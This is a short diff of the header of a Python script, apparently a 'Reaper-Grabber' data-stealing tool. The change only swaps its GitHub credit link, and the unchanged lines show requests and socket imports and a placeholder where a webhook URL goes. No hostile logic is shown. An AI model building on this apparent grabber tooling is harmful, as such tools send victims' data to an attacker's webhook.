@@ -1,7 +1,7 @@
 import requests
 import socket
 
-#! Made by https://github.com/nullylol/Reaper-Grabber
+#! Made by https://github.com/rqzu/Reaper-Grabber
 
 webhook = "webhook_here" #!  Webhook goes here
 
